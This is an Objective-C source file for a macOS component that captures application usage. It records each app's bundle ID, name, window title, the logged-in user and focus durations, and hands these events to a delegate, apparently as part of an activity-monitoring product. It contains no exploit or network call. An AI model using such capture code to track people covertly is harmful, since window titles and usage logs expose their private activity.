//
//  ApplicationUsage.m
//  ApplicationUsageCaptureManager
//
//  Created by ophat on 2/5/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "ApplicationUsage.h"

#import "DateTimeFormat.h"
#import "FxApplicationUsageEvent.h"
#import "SystemUtilsImpl.h"

@implementation ApplicationUsage
@synthesize mTimerKeeper;
@synthesize mDelegate, mSelector;

- (id) init {
    self = [super init];
    if (self) {
        self.mTimerKeeper = [NSMutableArray array];
    }
    return (self);
}

-(void)startCapture{
    [self stopCapture];
    
    DLog(@"Start ApplicationUsage");
    self.mTimerKeeper = [NSMutableArray array];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(active:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(deactive:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
}

-(void)stopCapture{
    DLog(@"Stop ApplicationUsage");
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    self.mTimerKeeper = nil;
}

-(void) active:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    NSString *bundleID = [app bundleIdentifier];
    
    if (![bundleID isEqualToString:[[NSBundle mainBundle] bundleIdentifier]]) {
      
        NSString *localizedName = [app localizedName];
        NSString *title = [SystemUtilsImpl frontApplicationWindowTitle];
        if (!bundleID) bundleID = @"";
        if (!localizedName) localizedName = @"";
        if (!title) title = @"";

        NSMutableArray * usageInfo = [[NSMutableArray alloc]init];
        [usageInfo addObject:bundleID];
        [usageInfo addObject:localizedName];
        [usageInfo addObject:title];
        [usageInfo addObject:[self getDateTime]];
        [mTimerKeeper addObject:usageInfo];
        [usageInfo release];
    }
}

-(void) deactive:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    NSString * endTime = [self getDateTime];
    NSInteger indexStop = NSNotFound;
    for (int i =0; i < [mTimerKeeper count]; i++) {
        NSMutableArray * usageInfo = [mTimerKeeper objectAtIndex:i];
        NSString *bundleID = [usageInfo objectAtIndex:0];
        NSString *name = [usageInfo objectAtIndex:1];
        NSString *title = [usageInfo objectAtIndex:2];
        NSString *startTime = [usageInfo objectAtIndex:3];
        if ([bundleID isEqualToString:[app bundleIdentifier]]) {
            indexStop = i;
            
            NSDateFormatter *df = [[[NSDateFormatter alloc] init] autorelease];
            [df setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
            
            NSDate * nsStart = [df dateFromString:startTime];
            NSDate * nsEnd = [df dateFromString:endTime];
            
            NSCalendar *gregorianCalendar = [[NSCalendar alloc] initWithCalendarIdentifier:NSCalendarIdentifierGregorian]; // NSGregorianCalendar deprecated
            NSUInteger unitFlags =  NSCalendarUnitSecond;
            NSDateComponents *components = [gregorianCalendar components:unitFlags
                                                                fromDate:nsStart
                                                                  toDate:nsEnd
                                                                 options:0];
            [gregorianCalendar release];
            
            NSNumber *pid = [NSNumber numberWithInteger:[app processIdentifier]];
            NSString *deactiveTitle = [SystemUtilsImpl frontApplicationWindowTitleWithPID:pid];
            int totalused = (int)[components second];
            
            if (!deactiveTitle) deactiveTitle = title;
            
            DLog(@"App ID     : %@",bundleID);
            DLog(@"App Name   : %@",name);
            DLog(@"App title  : %@",title);
            DLog(@"App title2 : %@",deactiveTitle);
            DLog(@"Start Time : %@",startTime);
            DLog(@"End Time   : %@",endTime);
            DLog(@"Total Used : %d",totalused);
            
            if ([mDelegate respondsToSelector:mSelector] && totalused > 0 ) {
                FxApplicationUsageEvent *applicationUsageEvent = [[FxApplicationUsageEvent alloc] init];
                [applicationUsageEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [applicationUsageEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                [applicationUsageEvent setMApplicationID:bundleID];
                [applicationUsageEvent setMApplicationName:name];
                [applicationUsageEvent setMTitle:deactiveTitle];
                [applicationUsageEvent setMActiveFocusTime:startTime];
                [applicationUsageEvent setMLostFocusTime:endTime];
                [applicationUsageEvent setMDuration:(NSUInteger)totalused];
                [mDelegate performSelector:mSelector withObject:applicationUsageEvent];
                [applicationUsageEvent release];
            }
        }
    }
    
    if(indexStop != NSNotFound){
        NSMutableArray * temp  = [[NSMutableArray alloc]init];
        for (int i =0; i < [mTimerKeeper count]; i++) {
            if ( i != indexStop) {
                [temp addObject:[mTimerKeeper objectAtIndex:i]];
            }
        }
        self.mTimerKeeper = [[temp mutableCopy] autorelease];
        [temp release];
    }
}

-(NSString *)getDateTime{
    NSDate *today = [NSDate date];
    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
    [dateFormat setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    NSString *dateString = [dateFormat stringFromDate:today];
    return dateString;
}

-(void)dealloc{
    [self stopCapture];
    [mTimerKeeper release];
    [super dealloc];
}
@end
